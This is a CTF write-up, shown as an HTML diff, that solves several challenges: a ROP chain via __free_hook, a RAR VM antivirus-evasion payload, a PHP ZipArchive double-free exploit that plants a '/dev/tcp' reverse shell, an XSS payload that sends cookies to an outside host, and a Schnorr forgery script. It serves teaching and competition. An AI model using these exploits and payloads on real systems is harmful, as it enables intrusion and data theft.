+    y.send( p.ljust( 0x100 , &#39;\0&#39; ) )
+    r = y.recv( 0x1000 )
+    print r[:0x100]</p>
+<p>def dle_con( idx ):
+    p = p32( 3 , endian = &#39;big&#39; )
+    p += p32( idx , endian = &#39;big&#39; )
+    y.send( p.ljust( 0x100 , &#39;\0&#39; ) )
+    r = y.recv( 0x1000 )
+    print r[:0x50]</p>
+<p>def add_msg( to , l , msg ):
+    p = p32( 4 , endian = &#39;big&#39; )
+    p += p32( to , endian = &#39;big&#39; )
+    p += p32( l , endian = &#39;big&#39; )
+    p += msg
+    y.send( p.ljust( 0x100 , &#39;\0&#39; )[:0x1000] )
+    r = y.recv( 0x1000 )
+    print r[:0x20]</p>
+<p>def dle_msg( idx ):
+    p = p32( 6 , endian = &#39;big&#39; )
+    p += p32( idx , endian = &#39;big&#39; )
+    y.send( p.ljust( 0x100 , &#39;\0&#39; ) )
+    r = y.recv( 0x1000 )
+    print r[:0x50]</p>
+<p>def list_msg():
+    p = p32( 5 , endian = &#39;big&#39; )
+    y.send( p.ljust( 0x100 , &#39;\0&#39; ) )
+    r = y.recv( 0x1000 )
+    print r[:0x100]</p>
+<p>add_con( 0x100 , &#39;a&#39; <em> 0x50 , 0x10 , &#39;1&#39; </em> 0x10 )</p>
+<p>add_msg( 0 , 0x68 , &#39;A&#39; <em> 0x10 )
+dle_msg(0)
+add_msg( 0 , 0x2000 , &#39;A&#39; </em> 0x10 )
+dle_msg(0)</p>
+<p>free_hook = 0x6BEE98
+pop_rdi = 0x400686
+pop_rsi = 0x410df3
+pop_rdx = 0x44a175
+pop_rax = 0x44a11c
+syscall = 0x47db6f</p>
+<p>p = flat(
+    pop_rdi,
+    free_hook - 8,
+    pop_rsi,
+    0,
+    pop_rdx,
+    0,
+    pop_rax,
+    0x3b,
+    syscall
+)</p>
+<p>add_msg( 0 , 0x68 , p64( free_hook - 8 ) )
+add_msg( 0 , 0x68 , p )
+add_msg( 0 , 0x68 , &#39;/bin/sh\0&#39; + p64( 0x4a9678 ) ) # xchg eax, edi ; xchg eax, esp ; ret</p>
+<p>dle_msg(1) # trgger __free_hook -&gt; stack pivot</p>
+<p>y.interactive()</p>
+<pre class="hljs"><code>
+<span class="hljs-meta">### anti-antivirus</span>
+* Use rarvmtools to create rar file <span class="hljs-keyword">and</span> upload.
+```c=
+<span class="hljs-meta">#include &lt;constants.rh&gt;</span>
+<span class="hljs-meta">#include &lt;crctools.rh&gt;</span>
+<span class="hljs-meta">#include &lt;math.rh&gt;</span>
+<span class="hljs-meta">#include &lt;util.rh&gt;</span>
+<span class="hljs-comment">; vim: syntax=fasm</span>
+
+<span class="hljs-symbol">_start:</span>
+    <span class="hljs-keyword">mov</span>    [<span class="hljs-built_in">r0</span>],<span class="hljs-meta">#1752392034</span>
+    <span class="hljs-keyword">add</span>    <span class="hljs-built_in">r0</span>,<span class="hljs-meta">#4</span>
+    <span class="hljs-keyword">mov</span>    [<span class="hljs-built_in">r0</span>],<span class="hljs-meta">#543370528</span>
+    <span class="hljs-keyword">add</span>    <span class="hljs-built_in">r0</span>,<span class="hljs-meta">#4</span>
+    <span class="hljs-keyword">mov</span>    [<span class="hljs-built_in">r0</span>],<span class="hljs-meta">#1935761954</span>
+    <span class="hljs-keyword">add</span>    <span class="hljs-built_in">r0</span>,<span class="hljs-meta">#4</span>
+    <span class="hljs-keyword">mov</span>    [<span class="hljs-built_in">r0</span>],<span class="hljs-meta">#540942440</span>
+    <span class="hljs-keyword">add</span>    <span class="hljs-built_in">r0</span>,<span class="hljs-meta">#4</span>
+    <span class="hljs-keyword">mov</span>    [<span class="hljs-built_in">r0</span>],<span class="hljs-meta">#1986356271</span>
+    <span class="hljs-keyword">add</span>    <span class="hljs-built_in">r0</span>,<span class="hljs-meta">#4</span>
+    <span class="hljs-keyword">mov</span>    [<span class="hljs-built_in">r0</span>],<span class="hljs-meta">#1885565999</span>
+    <span class="hljs-keyword">add</span>    <span class="hljs-built_in">r0</span>,<span class="hljs-meta">#4</span>
+    <span class="hljs-keyword">mov</span>    [<span class="hljs-built_in">r0</span>],<span class="hljs-meta">#808726831</span>
+    <span class="hljs-keyword">add</span>    <span class="hljs-built_in">r0</span>,<span class="hljs-meta">#4</span>
+    <span class="hljs-keyword">mov</span>    [<span class="hljs-built_in">r0</span>],<span class="hljs-meta">#858861870</span>
+    <span class="hljs-keyword">add</span>    <span class="hljs-built_in">r0</span>,<span class="hljs-meta">#4</span>
+    <span class="hljs-keyword">mov</span>    [<span class="hljs-built_in">r0</span>],<span class="hljs-meta">#926298414</span>
+    <span class="hljs-keyword">add</span>    <span class="hljs-built_in">r0</span>,<span class="hljs-meta">#4</span>
+    <span class="hljs-keyword">mov</span>    [<span class="hljs-built_in">r0</span>],<span class="hljs-meta">#892875054</span>
+    <span class="hljs-keyword">add</span>    <span class="hljs-built_in">r0</span>,<span class="hljs-meta">#4</span>
+    <span class="hljs-keyword">mov</span>    [<span class="hljs-built_in">r0</span>],<span class="hljs-meta">#875836463</span>
+    <span class="hljs-keyword">add</span>    <span class="hljs-built_in">r0</span>,<span class="hljs-meta">#4</span>
+    <span class="hljs-keyword">mov</span>    [<span class="hljs-built_in">r0</span>],<span class="hljs-meta">#1043341364</span>
+    <span class="hljs-keyword">add</span>    <span class="hljs-built_in">r0</span>,<span class="hljs-meta">#4</span>
+    <span class="hljs-keyword">mov</span>    [<span class="hljs-built_in">r0</span>],<span class="hljs-meta">#2240806</span>
+    <span class="hljs-keyword">add</span>    <span class="hljs-built_in">r0</span>,<span class="hljs-meta">#4</span>
+    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r0</span>,<span class="hljs-meta">#0 </span>
+    <span class="hljs-keyword">add</span>     <span class="hljs-built_in">r0</span>,<span class="hljs-meta">#445497328</span>
+    <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r1</span>,<span class="hljs-built_in">r0</span>
+    <span class="hljs-keyword">add</span>     <span class="hljs-built_in">r1</span>,<span class="hljs-meta">#4111392</span>
+    <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r2</span>,[<span class="hljs-built_in">r1</span>]
+    <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r1</span>,<span class="hljs-built_in">r2</span>
+    <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">r1</span>,<span class="hljs-meta">#619536</span>
+    <span class="hljs-keyword">add</span>     <span class="hljs-built_in">r1</span>,<span class="hljs-meta">#324672 </span>
+    <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r2</span>,<span class="hljs-built_in">r0</span>
+    <span class="hljs-keyword">add</span>     <span class="hljs-built_in">r2</span>,<span class="hljs-meta">#4118760</span>
+    <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">r2</span>],<span class="hljs-built_in">r1</span>
+
+    <span class="hljs-keyword">add</span>     <span class="hljs-built_in">r2</span>,<span class="hljs-meta">#4</span>
+    <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r1</span>,<span class="hljs-built_in">r0</span>
+    <span class="hljs-keyword">add</span>     <span class="hljs-built_in">r1</span>,<span class="hljs-meta">#4111396</span>
+    <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r4</span>,[<span class="hljs-built_in">r1</span>]
+    <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r1</span>,<span class="hljs-built_in">r4</span> 
+    <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">r2</span>],<span class="hljs-built_in">r1</span>
+    <span class="hljs-keyword">call</span>    $_success
+</code></pre><h3 id="mop"><a class="header-link" href="#mop"></a>MoP</h3>
+<p>First, we find out the commit version <code>37a8408e8</code> according to hint, and get diff info as below.</p>
+<pre class="hljs"><code>$ diff -r php-src<span class="hljs-regexp">/ext/</span>zip<span class="hljs-regexp">/php_zip.c no_realworld_php/</span>ext<span class="hljs-regexp">/zip/</span>php_zip.c
+<span class="hljs-number">1383</span>d1382
+&lt;         ze_obj-&gt;filename = <span class="hljs-keyword">NULL</span>;</code></pre><p>Obviously, There is a double free vulnerability we can exploit at ZipArchive class. 
+In zend allocator, <code>_emalloc</code> does not check any metadata from the freed chunk,
+so we can simply get <code>arbitray read/write</code>. </p>
+<p>Leak the libc, overwrite <code>__free_hook</code>, and get reverse shell!!</p>
+<pre class="hljs"><code><span class="php"><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read_ptr</span><span class="hljs-params">(&amp;$mystring,$index=<span class="hljs-number">0</span>,$little_endian=<span class="hljs-number">1</span>)</span></span>{
+
+<span class="hljs-keyword">return</span> hexdec(dechex(ord($mystring[$index+<span class="hljs-number">7</span>])) .dechex(ord($mystring[$index+<span class="hljs-number">6</span>])) . dechex(ord($mystring[$index+<span class="hljs-number">5</span>])).dechex(ord($mystring[$index+<span class="hljs-number">4</span>])).dechex(ord($mystring[$index+<span class="hljs-number">3</span>])).dechex(ord($mystring[$index+<span class="hljs-number">2</span>])). dechex(ord($mystring[$index+<span class="hljs-number">1</span>])).dechex(ord($mystring[$index+<span class="hljs-number">0</span>])));
+
+}
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write_ptr</span><span class="hljs-params">(&amp;$mystring,$value,$index=<span class="hljs-number">0</span>,$little_endian=<span class="hljs-number">1</span>)</span></span>{
+<span class="hljs-comment">//$value=dechex($value);</span>
+$mystring[$index]=chr($value&amp;<span class="hljs-number">0xFF</span>);
+$mystring[$index+<span class="hljs-number">1</span>]=chr(($value&gt;&gt;<span class="hljs-number">8</span>)&amp;<span class="hljs-number">0xFF</span>);
+$mystring[$index+<span class="hljs-number">2</span>]=chr(($value&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xFF</span>);
+$mystring[$index+<span class="hljs-number">3</span>]=chr(($value&gt;&gt;<span class="hljs-number">24</span>)&amp;<span class="hljs-number">0xFF</span>);
+$mystring[$index+<span class="hljs-number">4</span>]=chr(($value&gt;&gt;<span class="hljs-number">32</span>)&amp;<span class="hljs-number">0xFF</span>);
+$mystring[$index+<span class="hljs-number">5</span>]=chr(($value&gt;&gt;<span class="hljs-number">40</span>)&amp;<span class="hljs-number">0xFF</span>);
+$mystring[$index+<span class="hljs-number">6</span>]=chr(($value&gt;&gt;<span class="hljs-number">48</span>)&amp;<span class="hljs-number">0xFF</span>);
+$mystring[$index+<span class="hljs-number">7</span>]=chr(($value&gt;&gt;<span class="hljs-number">56</span>)&amp;<span class="hljs-number">0xFF</span>);
+
+}
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">int_to_string</span><span class="hljs-params">($value,$index=<span class="hljs-number">0</span>)</span></span>{
+        $mystring = <span class="hljs-string">"aaaaaaaa"</span>;
+        $mystring[$index]=chr($value&amp;<span class="hljs-number">0xFF</span>);
+        $mystring[$index+<span class="hljs-number">1</span>]=chr(($value&gt;&gt;<span class="hljs-number">8</span>)&amp;<span class="hljs-number">0xFF</span>);
+        $mystring[$index+<span class="hljs-number">2</span>]=chr(($value&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xFF</span>);
+        $mystring[$index+<span class="hljs-number">3</span>]=chr(($value&gt;&gt;<span class="hljs-number">24</span>)&amp;<span class="hljs-number">0xFF</span>);
+        $mystring[$index+<span class="hljs-number">4</span>]=chr(($value&gt;&gt;<span class="hljs-number">32</span>)&amp;<span class="hljs-number">0xFF</span>);
+        $mystring[$index+<span class="hljs-number">5</span>]=chr(($value&gt;&gt;<span class="hljs-number">40</span>)&amp;<span class="hljs-number">0xFF</span>);
+        $mystring[$index+<span class="hljs-number">6</span>]=chr(($value&gt;&gt;<span class="hljs-number">48</span>)&amp;<span class="hljs-number">0xFF</span>);
+        $mystring[$index+<span class="hljs-number">7</span>]=chr(($value&gt;&gt;<span class="hljs-number">56</span>)&amp;<span class="hljs-number">0xFF</span>);
+        <span class="hljs-keyword">return</span> $mystring;
+    }
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SplFixedArray2</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">SplFixedArray</span></span>{
+<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">offsetGet</span><span class="hljs-params">($offset)</span> </span>{}
+<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Count</span><span class="hljs-params">()</span> </span>{<span class="hljs-keyword">echo</span> <span class="hljs-string">"!!!!######!#!#!#COUNT##!#!#!#!#"</span>;}
+}
+
+$z=<span class="hljs-keyword">array</span>();
+
+<span class="hljs-keyword">for</span> ($x=<span class="hljs-number">0</span>;$x&lt;<span class="hljs-number">100</span>;$x++){
+    $z[$x]=<span class="hljs-keyword">new</span> SplFixedArray(<span class="hljs-number">5</span>);
+}
+<span class="hljs-keyword">unset</span>($z[<span class="hljs-number">50</span>]);
+$zip = <span class="hljs-keyword">new</span> ZipArchive;
+<span class="hljs-comment">// Double free</span>
+$zip-&gt;open(<span class="hljs-string">'/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span>, ZipArchive::CREATE);
+$zip-&gt;open(<span class="hljs-string">'/tmp/z1.zip'</span>);
+$zip-&gt;open(<span class="hljs-string">'/tmp/z1.zip'</span>);
+$s=str_repeat(<span class="hljs-string">'C'</span>,<span class="hljs-number">0x48</span>);
+$t=<span class="hljs-keyword">new</span> SplFixedArray2(<span class="hljs-number">5</span>);
+
+<span class="hljs-keyword">unset</span>($z[<span class="hljs-number">51</span>]);
+<span class="hljs-keyword">unset</span>($z[<span class="hljs-number">52</span>]);
+$libc_addr=read_ptr($s,<span class="hljs-number">0x48</span>)+ <span class="hljs-number">0x2aed7c0</span>;
+<span class="hljs-keyword">print</span> <span class="hljs-string">"Leak libc memory location: 0x"</span> . dechex($libc_addr) . <span class="hljs-string">"\n"</span>;
+
+
+
+$zip4 = <span class="hljs-keyword">new</span> ZipArchive;
+$zip2 = <span class="hljs-keyword">new</span> ZipArchive;
+$zip3 = <span class="hljs-keyword">new</span> ZipArchive;
+
+<span class="hljs-comment">// Double free</span>
+$zip4-&gt;open(<span class="hljs-string">'/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span>, ZipArchive::CREATE);
+$zip4-&gt;open(<span class="hljs-string">'/tmp/z1.zip'</span>);
+$zip4-&gt;open(<span class="hljs-string">'/tmp/z1.zip'</span>);
+
+$zip2-&gt;open(<span class="hljs-string">'/tmp/BBBBBBBB'</span>, ZipArchive::CREATE);
+
+<span class="hljs-comment">// first 8 bytes is fd we want to overwrite</span>
+$zip2-&gt;addFromString(<span class="hljs-string">'bash -c "bash &gt; /dev/tcp/IP/4444 0&gt;&amp;1";'</span>, int_to_string($libc_addr+<span class="hljs-number">0x3ed8e8</span>).<span class="hljs-string">'GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG'</span>);
+$zip2-&gt;addFromString(<span class="hljs-string">'bash -c "bash &gt; /dec/tcp/IP/4444 0&gt;&amp;1";'</span>, <span class="hljs-string">"\0\0\0\0\0\0\0"</span>.<span class="hljs-string">'GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG'</span>);
+
+<span class="hljs-comment">//get our chunk, arbitary write,   size cannot change...</span>
+$zip2-&gt;addFromString(<span class="hljs-string">'bash -c "bash &gt; /dev/tcp/IP/4444 0&gt;&amp;1";'</span>, int_to_string($libc_addr+<span class="hljs-number">0x4f440</span>).<span class="hljs-string">'GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG'</span>);
+
+<span class="hljs-meta">?&gt;</span></span>
+</code></pre><h4 id="open_basedir-bypass"><a class="header-link" href="#open_basedir-bypass"></a>open_basedir bypass</h4>
+<p>Rumor has that this exploit still works in this challenge, even if it&#39;s PHP 7.4 ~ 8. Then you can get those juicy addresses under <code>/proc</code> through <code>echo file_get_contents(&#39;/proc/self/maps&#39;);</code> Actually I didn&#39;t realize they still haven&#39;t fixed this bug...... It&#39;s almost half of a year ago.</p>
+<p>Please refer to <a href="https://twitter.com/edgarboda/status/1113839230608797696">@Blaklis_&#39;s tweet (@edgarboda retweets)</a></p>
+<h2 id="web"><a class="header-link" href="#web"></a>Web</h2>
+<h3 id="crawl-box-(unsolved)"><a class="header-link" href="#crawl-box-(unsolved)"></a>crawl box (unsolved)</h3>
+<p>The server uses scrapy with headless chromium to crawl the page. We search for some keyword about scrapy, and found <a href="https://medium.com/alertot/web-scraping-considered-dangerous-exploiting-the-telnet-service-in-scrapy-1-5-2-ad5260fea0db">this post</a>.</p>
+<p>I leverage somd <a href="https://bookgin.tw/2019/01/05/abusing-dns-browser-based-port-scanning-and-dns-rebinding/">DNS-based browser port scanning</a> technique to check that the <code>127.0.0.1:6023</code> is opened. The following DNS record for example.com is configured:</p>
+<pre class="hljs"><code>127<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span> <span class="hljs-selector-tag">example</span><span class="hljs-selector-class">.com</span> <span class="hljs-selector-tag">A</span>
+240<span class="hljs-selector-class">.240</span><span class="hljs-selector-class">.240</span><span class="hljs-selector-class">.240</span> <span class="hljs-selector-tag">example</span><span class="hljs-selector-class">.com</span> <span class="hljs-selector-tag">A</span></code></pre><p>And I found that the browser it will never send a request to <code>240.240.240.240</code>, which indicates that the port is opened. The reason is that chromium will always resolve to 127.0.0.1 first. For more detail you can refer to <a href="(https://bookgin.tw/2019/01/05/abusing-dns-browser-based-port-scanning-and-dns-rebinding/">my article</a>).</p>
+<p>Unfortunately, only scrapy &lt; 1.5.2 is vulnerable to this RCE explot, because the telnet is not even protected with password. For scrapy &gt;= 1.5.3, the telnet is protected with <a href="https://docs.scrapy.org/en/latest/topics/telnetconsole.html">8-byte password</a>.</p>
+<p>Then we got stuck here until the competition ended.</p>
+<p>According to <a href="https://twitter.com/phithon_xg/status/1173446436614094849">@phithon_xg&#39;s twitter</a>, scrapy will also expose a <a href="https://docs.scrapy.org/en/0.16/topics/scrapyd.html#web-interface">web API interface</a>.</p>
+<p>Okay, so maybe next time I&#39;ll try to either search for more information about this library, or just browser the official doc.</p>
+<h4 id="failed-attempts"><a class="header-link" href="#failed-attempts"></a>Failed Attempts</h4>
+<ul class="list">
+<li>Protocol smuggling to send CSRF to telnet: The telnet will refuse to negotiate for any payload after <code>\r\n</code>, so for simple HTTP method it will fail to authenticate. But <a href="https://twitter.com/stereotype32/status/1173429071826472960">@stereotype32&#39;s idea</a> is pretty cool, using DNS rebinding to bypass CORS and send a customized HTTP method.</li>
+<li>Guessing the password: The password has 8 bytes. Although it seems <a href="https://github.com/twisted/twisted/blob/3b116ebd785f1ea0f9d8bf8fde27874b0f28a3df/src/twisted/cred/credentials.py#L459-L467">vulnerable to side-challen attack</a> in twisted library, it will be too difficult to exploit it using headless chromium.</li>
+</ul>
+<h3 id="mission-invisible"><a class="header-link" href="#mission-invisible"></a>Mission Invisible</h3>
+<p>This is a XSS challenge:</p>
+<pre class="hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
+    <span class="hljs-keyword">var</span> getUrlParam = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">name</span>) </span>{
+        <span class="hljs-keyword">var</span> reg = <span class="hljs-keyword">new</span> <span class="hljs-built_in">RegExp</span>(<span class="hljs-string">"(^|&amp;)"</span> + name + <span class="hljs-string">"=([^&amp;]*)(&amp;|$)"</span>);
+        <span class="hljs-keyword">var</span> r = <span class="hljs-built_in">unescape</span>(<span class="hljs-built_in">window</span>.location.search.substr(<span class="hljs-number">1</span>)).match(reg);
+        <span class="hljs-keyword">if</span> (r != <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> r[<span class="hljs-number">2</span>];
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setCookie</span>(<span class="hljs-params">name, value</span>) </span>{
+        <span class="hljs-keyword">var</span> Days = <span class="hljs-number">30</span>;
+        <span class="hljs-keyword">var</span> exp = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>();
+        exp.setTime(exp.getTime() + Days * <span class="hljs-number">24</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">30</span>);
+        <span class="hljs-built_in">document</span>.cookie = name + <span class="hljs-string">"="</span> + value + <span class="hljs-string">";expires="</span> + exp.toGMTString();
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCookie</span>(<span class="hljs-params">name</span>) </span>{
+        <span class="hljs-keyword">var</span> search = name + <span class="hljs-string">"="</span>
+        <span class="hljs-keyword">var</span> offset = <span class="hljs-built_in">document</span>.cookie.indexOf(search)
+        <span class="hljs-keyword">if</span> (offset != <span class="hljs-number">-1</span>) {
+            offset += search.length;
+            <span class="hljs-keyword">var</span> end = <span class="hljs-built_in">document</span>.cookie.indexOf(<span class="hljs-string">";"</span>, offset);
+            <span class="hljs-keyword">if</span> (end == <span class="hljs-number">-1</span>) {
+                end = <span class="hljs-built_in">document</span>.cookie.length;
+            }
+            <span class="hljs-keyword">return</span> <span class="hljs-built_in">unescape</span>(<span class="hljs-built_in">document</span>.cookie.substring(offset, end));
+        }
+        <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>;
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setElement</span>(<span class="hljs-params">tag</span>) </span>{
+        tag = tag.substring(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>);
+        <span class="hljs-keyword">var</span> ele = <span class="hljs-built_in">document</span>.createElement(tag)
+        <span class="hljs-keyword">var</span> attrs = getCookie(<span class="hljs-string">"attrs"</span>).split(<span class="hljs-string">"&amp;"</span>);
+        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; attrs.length; i++) {
+            <span class="hljs-keyword">var</span> key = attrs[i].split(<span class="hljs-string">"="</span>)[<span class="hljs-number">0</span>];
+            <span class="hljs-keyword">var</span> value = attrs[i].split(<span class="hljs-string">"="</span>)[<span class="hljs-number">1</span>];
+            ele.setAttribute(key, value);
+        }
+        <span class="hljs-built_in">document</span>.body.appendChild(ele);
+    }
+
+    <span class="hljs-keyword">var</span> tag = getUrlParam(<span class="hljs-string">"tag"</span>);
+    setCookie(<span class="hljs-string">"tag"</span>, tag);
+    setElement(tag);</span></code></pre><ol class="list">
+<li>Bypass getCookie(&quot;attr&quot;): <code>url?tag=attrs=3</code></li>
+<li>Bypass <code>;</code> and <code>&amp;</code>: When <code>getCookie</code>, it will unescape special characters. We can use percent-encoding <code>%26</code> to bypass</li>
+<li>Using <code>&lt;a&gt;</code> to XSS without user interaction: The remote headless chrome bot will not interact with the page, so we have to come out a approach to trigger the XSS without user interaction.</li>
+<li>Trigger <code>onfocus</code> event: We can use hash <code>url#foo</code> to trigger the <code>onfocus</code> event of an anchor<code>&lt;a&gt;</code> element with id <code>foo</code>. <a href="https://blogs.msmvps.com/alunj/2013/04/19/using-url-anchors-to-enliven-xss-exploits/">Reference</a> and <a href="https://security.stackexchange.com/questions/168909/xss-inside-anchor-tag-a-without-user-interaction">StackOverflow</a>.</li>
+</ol>
+<p>The key point is the <code>onfocus</code> event. It does not come out into my mind magically. First, I list all the attribute of <code>&lt;a&gt;</code> to see which events is useful. After that I search for some random keyword of those event with <code>anchor XSS</code>. Then ..... bingo.</p>
+<p>Payload:</p>
+<pre class="hljs"><code>http:<span class="hljs-regexp">//</span><span class="hljs-number">52.52</span>.<span class="hljs-number">236.217</span>:<span class="hljs-number">16401</span>/?tag=attrs=id%3Dfoo%2526onfocus%3Djavascript%3Afetch%28%27%2F%2F240.<span class="hljs-number">240.240</span>.<span class="hljs-number">240</span>%3A1234%3F%27%2Bdocument.cookie%29%2526href%3D%23foo<span class="hljs-comment">#foo</span>
+
+<span class="hljs-comment"># rwctf{fR0m1olotH!n9}</span></code></pre><h4 id="failed-attempts-1"><a class="header-link" href="#failed-attempts-1"></a>Failed Attempts</h4>
+<ul class="list">
+<li>Using CSS to triger javascript: We can inject <code>style</code> attribute thus we can perform CSS injection. Unfortunately in modern browsers, they do not support execute javascript in CSS.</li>
+<li><code>onmouseevent</code> + very large canvas: Once the user/bot&#39;s mouse moves into the page, it will trigger the event if we set a very large width and height in CSS. However this doesn&#39;t work because the remote bot will not interact with the page. There is no mouse event triggered.</li>
+</ul>
+<h2 id="crypto"><a class="header-link" href="#crypto"></a>Crypto</h2>
+<h3 id="bank"><a class="header-link" href="#bank"></a>bank</h3>
+<pre class="hljs"><code><span class="hljs-title">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-title">from</span> <span class="hljs-type">PoW</span> <span class="hljs-keyword">import</span> do_pow
+<span class="hljs-title">from</span> base64 <span class="hljs-keyword">import</span> b64encode
+
+<span class="hljs-title">from</span> schnorr <span class="hljs-keyword">import</span> *
+
+<span class="hljs-title">host</span>, <span class="hljs-keyword">port</span> = 'tcp.realworldctf.com', 20014
+
+def login(r, point):
+    msg = b64encode('{},{}'.format(*point))
+    r.sendlineafter('<span class="hljs-type">Please</span> tell us your public key:', msg)
+
+def deposit(r, sig):
+    msg = b64encode('1')
+    r.sendlineafter('our first priority!', msg)
+    msg = b64encode(sig)
+    r.sendlineafter('<span class="hljs-type">Please</span> send us your signature', msg)
+
+def withdraw(r, sig):
+    msg = b64encode('2')
+    r.sendlineafter('our first priority!', msg)
+    msg = b64encode(sig)
+    r.sendlineafter('<span class="hljs-type">Please</span> send us your signature', msg)
+
+def get_pubkey(r):
+    msg = b64encode('3')
+    r.sendlineafter('our first priority!', msg)
+    r.recvuntil('one of us: ')
+    s = r.recvline()[:-1]
+    return eval(s)
+
+def main():
+    r = remote(host, port)
+    do_pow(r)
+
+    login(r, <span class="hljs-type">G</span>)
+    sig = schnorr_sign('<span class="hljs-type">DEPOSIT</span>', 1)
+    deposit(r, sig)
+
+    login(r, <span class="hljs-type">G</span>)
+    P1 = get_pubkey(r)
+    P1_inv = (<span class="hljs-type">P1</span>[0], -<span class="hljs-type">P1</span>[1])
+    P2 = point_add(<span class="hljs-type">P1_inv</span>, <span class="hljs-type">G</span>)
+
+    login(r, <span class="hljs-type">P2</span>)
+    sig = schnorr_sign('<span class="hljs-type">WITHDRAW</span>', 1)
+    withdraw(r, sig)
+    r.interactive()
+
+main()
+
+# rwctf{P1Ain_SChNorr_n33Ds_m0re_5ecur1ty!}</code></pre>        </article>
+      </div>
+    </div>
+  </body>
+</html>
